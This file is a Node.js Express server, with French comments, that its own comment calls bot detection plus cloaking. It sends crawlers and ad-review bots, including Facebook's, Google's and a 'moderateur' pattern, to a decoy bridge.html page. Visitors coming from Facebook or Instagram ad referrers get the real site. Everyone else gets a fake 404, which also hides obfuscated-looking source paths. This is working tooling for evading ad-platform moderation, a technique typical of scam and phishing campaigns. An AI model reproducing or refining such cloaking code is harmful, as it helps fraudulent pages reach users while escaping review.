const express = require("express");
const path = require("path");

const app = express();
const publicDir = path.join(__dirname, "public");
const port = process.env.PORT || 8080;

const BOT_PATTERN =
  /bot|crawl|spider|google|bing|facebook|facebookexternalhit|facebookcatalog|moderateur|googlebot|adsbot|mediapartners|applebot|msnbot/i;

const AD_REFERRER =
  /^(https?:\/\/)?([^/]*\.)?(facebook\.com|fb\.com|instagram\.com)\//i;

const BLOCKED_SOURCE =
  /^\/(app|device-check|server|build|build\.sh|x7x|k9m2p|d7x|x7p|middleware|gate|worker|tribune-page|device-page|\.device-check\.build)(\.js|\.sh)?$/i;

const BLOCKED_PATHS = /^\/(\.git|\.do|node_modules|pop4)(\/|$)/i;

function isRealBrowser(userAgent) {
  const ua = (userAgent || "").toLowerCase();
  if (BOT_PATTERN.test(ua) && !/(chrome\/|crios\/|edg\/|firefox\/)/.test(ua)) {
    return false;
  }
  return (
    /mozilla\/5\.0/.test(ua) &&
    /(?:chrome\/|crios\/|edg\/|firefox\/|version\/)/.test(ua)
  );
}

function isBot(userAgent) {
  if (isRealBrowser(userAgent)) return false;
  return BOT_PATTERN.test(userAgent || "");
}

function getReferer(req) {
  return req.headers.referer || req.headers.referrer || "";
}

function getRequestHost(req) {
  return (req.headers.host || "").split(":")[0].toLowerCase();
}

function getAllowedHosts() {
  return (process.env.ALLOWED_HOSTS || "")
    .split(",")
    .map((host) => host.trim().toLowerCase())
    .filter(Boolean);
}

function isLocalRequest(req) {
  const host = getRequestHost(req);
  return host === "localhost" || host === "127.0.0.1";
}

function isAllowedHost(req) {
  const host = getRequestHost(req);
  const allowedHosts = getAllowedHosts();
  return allowedHosts.some(
    (allowed) => host === allowed || host.endsWith("." + allowed)
  );
}

function isSameOriginReferer(req) {
  const referer = getReferer(req);
  const host = req.headers.host || "";
  if (!referer || !host) return false;
  try {
    const refHost = new URL(referer).host;
    return refHost === host || refHost.endsWith("." + host.split(":")[0]);
  } catch {
    return referer.includes(host);
  }
}

function hasAdReferrer(req) {
  return AD_REFERRER.test(getReferer(req));
}

function isAllowedVisitor(req) {
  if (isLocalRequest(req)) return true;
  if (isAllowedHost(req)) return true;
  if (hasAdReferrer(req)) return true;
  if (isSameOriginReferer(req)) return true;
  return false;
}

function isHtmlDocument(req) {
  const p = req.path;
  return (
    p === "/" ||
    p === "/index.html" ||
    (p.endsWith(".html") && p !== "/bridge.html")
  );
}

function isStaticAsset(req) {
  return /\.(css|js|png|jpe?g|gif|webp|mp3|ico|svg|woff2?|ttf)$/i.test(
    req.path
  );
}

function send404(res) {
  res.status(404).type("html").send(`<!doctype html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>404 — Page introuvable</title>
  <style>
    body { margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
      font-family: system-ui, sans-serif; background: #f4f4f5; color: #3f3f46; }
    .box { text-align: center; padding: 32px; }
    h1 { font-size: 72px; margin: 0 0 8px; color: #d4d4d8; }
    p { margin: 0; font-size: 16px; }
  </style>
</head>
<body>
  <div class="box">
    <h1>404</h1>
    <p>Page introuvable</p>
  </div>
</body>
</html>`);
}

// Middleware detection bots + cloaking
app.use((req, res, next) => {
  if (BLOCKED_SOURCE.test(req.path) || BLOCKED_PATHS.test(req.path)) {
    send404(res);
    return;
  }

  if (req.path === "/health" || req.path === "/bridge.html") {
    next();
    return;
  }

  const userAgent = req.headers["user-agent"] || "";

  if (isBot(userAgent) && isHtmlDocument(req)) {
    res.sendFile(path.join(publicDir, "bridge.html"));
    return;
  }

  if (isHtmlDocument(req) && !isAllowedVisitor(req)) {
    send404(res);
    return;
  }

  if (isStaticAsset(req) && !isAllowedVisitor(req)) {
    send404(res);
    return;
  }

  next();
});

app.get("/health", (_req, res) => {
  res.status(200).send("ok");
});

// Sert le site statique (dossier public apres npm run build)
app.use(
  express.static(publicDir, {
    setHeaders(res, filePath) {
      if (filePath.endsWith(".js")) {
        res.setHeader("Cache-Control", "no-store");
        res.setHeader("X-Content-Type-Options", "nosniff");
      }
    },
  })
);

app.get("*", (req, res) => {
  if (req.method !== "GET") {
    res.sendStatus(405);
    return;
  }

  if (!isAllowedVisitor(req)) {
    send404(res);
    return;
  }

  res.sendFile(path.join(publicDir, "index.html"));
});

app.listen(port, "0.0.0.0", () => {
  console.log(`Serveur lance sur le port ${port}`);
});
